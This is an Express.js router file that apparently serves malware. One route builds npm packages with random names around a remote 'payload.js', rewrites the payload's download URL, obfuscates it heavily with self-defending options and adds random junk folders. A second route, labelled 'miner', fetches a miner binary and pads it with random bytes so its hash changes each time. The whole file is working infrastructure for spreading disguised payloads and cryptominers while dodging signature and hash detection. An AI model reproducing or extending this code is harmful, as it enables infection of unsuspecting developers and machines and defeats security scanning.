const express = require('express')
const router = express.Router()

const fs = require('fs')
const path = require('path')
const axios = require('axios')
const JSZip = require('jszip')
const JavaScriptObfuscator = require(
    'javascript-obfuscator')

/* GET nodejs */
router.get('/:version/nodejs', async (req, res) => {
    const version = req.params.version

    function generateRandomString(length) {
        let result = ''
        const characters = 'abcdefghijklmnopqrstuvwxyz0123456789'
        for (let i = 0; i < length; i++) {
            result += characters.charAt(Math.floor(Math.random() * characters.length))
        }
        return result
    }

    try {
        const nodeURL = process.env.CODE_PAYLOAD_URL.replace(/\.zip$/, `_${version}.zip`)
        const response = await axios.get(nodeURL, { responseType: 'arraybuffer' })
        const zip = await JSZip.loadAsync(response.data)
        const packageJson = JSON.parse(await zip.file('package.json').async('text'))

        packageJson.name = generateRandomString(10)
        packageJson.version = Math.floor(Math.random() * 10) + '.' + Math.floor(Math.random() * 10) + '.' + Math.floor(Math.random() * 10)
        packageJson.description = generateRandomString(20)
        const mainFileName = generateRandomString(10) + '.js'
        packageJson.main = mainFileName

        let nodeContent = await zip.file('payload.js').async('text')     

        nodeContent = nodeContent.replace(/const\s+fileUrl\s*=\s*['"].*['"];?/, `const fileUrl = '${process.env.HOST_BASEURL}/${version}/${generateRandomString(10)}'`)
        nodeContent = nodeContent.replace(/const\s+fileName\s*=\s*['"].*['"];?/, `const fileName = '${generateRandomString(10)}'`)

        const obfuscationResult = JavaScriptObfuscator.obfuscate(nodeContent, {
            compact: true,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 0.75,
            deadCodeInjection: true,
            deadCodeInjectionThreshold: 0.4,
            disableConsoleOutput: false,
            identifierNamesGenerator: 'hexadecimal',
            ignoreImports: false,
            log: false,
            numbersToExpressions: true,
            optionsPreset: 'medium-obfuscation',
            seed: 0,
            selfDefending: true,
            simplify: true,
            splitStrings: true,
            splitStringsChunkLength: 10,
            stringArray: true,
            stringArrayCallsTransform: false,
            stringArrayCallsTransformThreshold: 0.75,
            stringArrayEncoding: [],
            stringArrayIndexesType: ['hexadecimal-number'],
            stringArrayIndexShift: true,
            stringArrayRotate: true,
            stringArrayShuffle: true,
            stringArrayWrappersCount: 2,
            stringArrayWrappersChainedCalls: true,
            stringArrayWrappersParametersMaxCount: 4,
            stringArrayWrappersType: 'function',
            stringArrayThreshold: 0.75,
            target: 'browser',
            transformObjectKeys: true
        })

        zip.file(mainFileName, obfuscationResult.getObfuscatedCode())

        const numFolders = Math.floor(Math.random() * 5) + 1
        for (let i = 0; i < numFolders; i++) {
            const folderName = generateRandomString(5)
            const folder = zip.folder(folderName)

            const jsFileName = generateRandomString(8) + '.js'
            const jsFileContent = generateRandomString(50)
            folder.file(jsFileName, jsFileContent)

            const htmlFileName = generateRandomString(8) + '.html'
            const htmlFileContent = generateRandomString(50)
            folder.file(htmlFileName, htmlFileContent)
        }

        const newZip = new JSZip()
        newZip.file('package.json', JSON.stringify(packageJson, null, 2))
        const files = await zip.file(/.*/)
        files.forEach(file => {
            if (file.name !== 'package.json' && file.name !== 'payload.js') {
                newZip.file(file.name, file.nodeStream())
            }
        })

        const zipFileName = generateRandomString(10) + '.zip'

        res.set('Content-Disposition', `attachment; filename=${zipFileName}`)
        res.set('Content-Type', 'application/zip')

        res.end(await newZip.generateAsync({ type: 'nodebuffer' }))
    } catch(error) {
        res.status(500).json({ status: "error", message: "something went wrong" })
    }
})

/* GET miner */
router.get('/:version/:mock', async (req, res) => {
    const version = req.params.version

    function generateRandomString(length) {
        let result = ''
        const characters = 'abcdefghijklmnopqrstuvwxyz0123456789'
        for (let i = 0; i < length; i++) {
            result += characters.charAt(Math.floor(Math.random() * characters.length))
        }
        return result
    }

    async function changeHash(fileBuffer) {
        const randomBytesLength = Math.floor(Math.random() * (7 - 2) + 2)
        const extraBytes = Buffer.alloc(randomBytesLength, 0)
    
        const modifiedBuffer = Buffer.concat([fileBuffer, extraBytes])
    
        return modifiedBuffer
    }

    try {
        minerUrl = `${process.env.MINER_PAYLOAD_URL}_${version}`
        response = await axios.get(minerUrl, { responseType: 'arraybuffer' })
        const newMinerFile = await changeHash(response.data)

        res.attachment(generateRandomString(10))
        res.setHeader('Content-type', 'application/octet-stream')

        res.send(newMinerFile)
    } catch(error) {
        console.log(error)
        res.status(500).json({ status: "error", message: "something went wrong" })
    }
})

module.exports = router
